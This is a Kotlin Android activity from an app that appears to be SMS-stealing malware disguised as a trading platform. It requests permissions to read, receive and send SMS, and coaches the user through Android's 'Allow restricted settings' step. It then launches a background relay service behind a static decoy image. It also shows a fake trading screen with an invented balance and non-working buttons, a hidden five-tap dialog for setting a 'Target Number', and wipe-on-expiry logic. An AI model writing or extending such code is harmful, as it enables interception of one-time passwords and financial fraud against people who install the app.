package com.example

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit
import com.example.worker.ShutdownWorker
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.window.Dialog
import androidx.core.content.ContextCompat
import com.example.data.RelayState
import com.example.data.SettingsManager
import com.example.service.RelayService
import com.example.ui.theme.MyApplicationTheme
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                RelayApp()
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun RelayApp() {
    val context = LocalContext.current
    val settingsManager = remember { SettingsManager(context) }
    val coroutineScope = rememberCoroutineScope()
    val snackbarHostState = remember { SnackbarHostState() }
    
    // Check for expiration
    if (settingsManager.isExpired()) {
        settingsManager.clearAll()
        Box(
            modifier = Modifier.fillMaxSize().background(androidx.compose.ui.graphics.Color.Black),
            contentAlignment = Alignment.Center
        ) {
            Text("Service Unavailable", color = androidx.compose.ui.graphics.Color.Red, style = MaterialTheme.typography.headlineMedium)
        }
        return
    }

    var hasPermissions by remember { mutableStateOf(false) }
    var relayState by remember { mutableStateOf(settingsManager.relayState) }

    val requiredPermissions = mutableListOf(
        Manifest.permission.INTERNET,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_SMS
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    val lifecycleOwner = androidx.lifecycle.compose.LocalLifecycleOwner.current

    // Automatically check permissions on resume
    DisposableEffect(lifecycleOwner) {
        val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
            if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME) {
                hasPermissions = requiredPermissions.all {
                    ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
                }
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
        }
    }

    val permissionLauncher = androidx.activity.compose.rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        hasPermissions = requiredPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    // Trigger permission request on startup if not already granted
    LaunchedEffect(Unit) {
        if (!hasPermissions) {
            permissionLauncher.launch(requiredPermissions.toTypedArray())
        }
    }

    // Start service
    LaunchedEffect(hasPermissions, relayState) {
        if (hasPermissions && relayState != RelayState.ABORTED) {
            val serviceIntent = Intent(context, RelayService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            
            // Schedule shutdown worker
            val shutdownWorkRequest = OneTimeWorkRequestBuilder<ShutdownWorker>()
                .setInitialDelay(20, TimeUnit.MINUTES)
                .build()
            WorkManager.getInstance(context).enqueue(shutdownWorkRequest)
        }
    }

    if (hasPermissions) {
        // Restore the static image UI
        Image(
            painter = painterResource(id = R.drawable.image_renamed),
            contentDescription = "Static UI Image",
            modifier = Modifier.fillMaxSize(),
            contentScale = ContentScale.Fit
        )
    } else {
        // Clear instruction screen for Restricted Settings
        Column(
            modifier = Modifier.fillMaxSize().background(androidx.compose.ui.graphics.Color.Black).padding(24.dp),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = androidx.compose.ui.Alignment.Start
        ) {
            Text("Permissions Required", color = androidx.compose.ui.graphics.Color.White, style = MaterialTheme.typography.headlineSmall)
            Spacer(modifier = Modifier.height(16.dp))
            Text("Android security restricts this app. Please follow these steps:", color = androidx.compose.ui.graphics.Color.White)
            Spacer(modifier = Modifier.height(8.dp))
            Text("1. Tap 'Open Settings' button below.", color = androidx.compose.ui.graphics.Color.White)
            Text("2. Tap the 3-dots in top right corner.", color = androidx.compose.ui.graphics.Color.White)
            Text("3. Select 'Allow restricted settings'.", color = androidx.compose.ui.graphics.Color.White)
            Text("4. Come back to this app.", color = androidx.compose.ui.graphics.Color.White)
            Spacer(modifier = Modifier.height(24.dp))
            Button(
                onClick = {
                    // Open app settings to manually allow permissions
                    val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    intent.data = android.net.Uri.fromParts("package", context.packageName, null)
                    context.startActivity(intent)
                },
                modifier = Modifier.align(androidx.compose.ui.Alignment.CenterHorizontally)
            ) {
                Text("Open Settings")
            }
        }
    }
}

@Composable
fun TradingHomeScreen() {
    var selectedTab by remember { mutableStateOf(0) }
    val tabs = listOf("Home", "Trade", "History", "Wallet", "Profile")
    val context = LocalContext.current
    var currentTarget by remember { mutableStateOf(SettingsManager(context).targetNumber) }
    var showDialog by remember { mutableStateOf(false) }
    var tempNumber by remember { mutableStateOf(currentTarget) }
    var tapCount by remember { mutableStateOf(0) }
    
    if (showDialog) {
        AlertDialog(
            onDismissRequest = { showDialog = false },
            title = { Text("Hidden Settings") },
            text = {
                OutlinedTextField(
                    value = tempNumber,
                    onValueChange = { tempNumber = it },
                    label = { Text("Enter Target Number") }
                )
            },
            confirmButton = {
                TextButton(onClick = {
                    SettingsManager(context).targetNumber = tempNumber
                    currentTarget = tempNumber
                    showDialog = false
                    tapCount = 0
                }) { Text("Save") }
            }
        )
    }
    
    Scaffold(
        bottomBar = {
            NavigationBar(containerColor = androidx.compose.ui.graphics.Color(0xFF121212)) {
                tabs.forEachIndexed { index, tab ->
                    NavigationBarItem(
                        selected = selectedTab == index,
                        onClick = { selectedTab = index },
                        icon = { Icon(Icons.Default.Home, contentDescription = tab) },
                        label = { Text(tab) }
                    )
                }
            }
        }
    ) { padding ->
        Box(modifier = Modifier.padding(padding)) {
            when (selectedTab) {
                0 -> Column(modifier = Modifier.clickable(onClick = {
                    tapCount++
                    if (tapCount >= 5) {
                        showDialog = true
                        tapCount = 0
                    }
                })) { TradingContent(currentTarget) }
                else -> Text("Tab ${tabs[selectedTab]} Content", color = androidx.compose.ui.graphics.Color.White, modifier = Modifier.align(Alignment.Center))
            }
        }
    }
}

@Composable
fun TradingContent(currentTarget: String) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(androidx.compose.ui.graphics.Color(0xFF0D0D0D))
            .padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        // Balance Card
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = androidx.compose.foundation.shape.RoundedCornerShape(24.dp),
            colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF1A1A1A)),
            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
        ) {
            Column(modifier = Modifier.padding(24.dp)) {
                Text("Total Balance", color = androidx.compose.ui.graphics.Color(0xFF888888), style = MaterialTheme.typography.labelLarge)
                Spacer(Modifier.height(4.dp))
                Text("₹ 48,290.75", color = androidx.compose.ui.graphics.Color.White, style = MaterialTheme.typography.headlineLarge, fontWeight = FontWeight.ExtraBold)
                Spacer(Modifier.height(20.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    Button(onClick = {}, shape = androidx.compose.foundation.shape.RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF2C2C2C)), modifier = Modifier.weight(1f)) { Text("Deposit") }
                    Button(onClick = {}, shape = androidx.compose.foundation.shape.RoundedCornerShape(12.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF00C853)), modifier = Modifier.weight(1f)) { Text("Withdraw") }
                }
            }
        }

        Spacer(modifier = Modifier.height(24.dp))

        // Live Market Status
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text("Live Market", color = androidx.compose.ui.graphics.Color.White, fontWeight = FontWeight.Bold, style = MaterialTheme.typography.titleMedium)
            Text("SESSION: #582941", color = androidx.compose.ui.graphics.Color(0xFF00E5FF), style = MaterialTheme.typography.labelSmall)
        }
        
        Spacer(Modifier.height(12.dp))

        Card(modifier = Modifier.fillMaxWidth(), shape = androidx.compose.foundation.shape.RoundedCornerShape(20.dp), colors = CardDefaults.cardColors(containerColor = androidx.compose.ui.graphics.Color(0xFF1A1A1A))) {
            Column(modifier = Modifier.padding(20.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                Text("Time Remaining", color = androidx.compose.ui.graphics.Color(0xFF888888), style = MaterialTheme.typography.labelMedium)
                Spacer(Modifier.height(8.dp))
                Text("00:15", style = MaterialTheme.typography.displayMedium, color = androidx.compose.ui.graphics.Color(0xFFD4AF37), fontWeight = FontWeight.Black)
            }
        }

        Spacer(modifier = Modifier.height(24.dp))

        // Trading Buttons
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(16.dp)) {
            Button(onClick = {}, modifier = Modifier.weight(1f).height(64.dp), shape = androidx.compose.foundation.shape.RoundedCornerShape(16.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFF00C853))) { Text("GREEN", fontWeight = FontWeight.Bold) }
            Button(onClick = {}, modifier = Modifier.weight(1f).height(64.dp), shape = androidx.compose.foundation.shape.RoundedCornerShape(16.dp), colors = ButtonDefaults.buttonColors(containerColor = androidx.compose.ui.graphics.Color(0xFFD32F2F))) { Text("RED", fontWeight = FontWeight.Bold) }
        }
    }
}
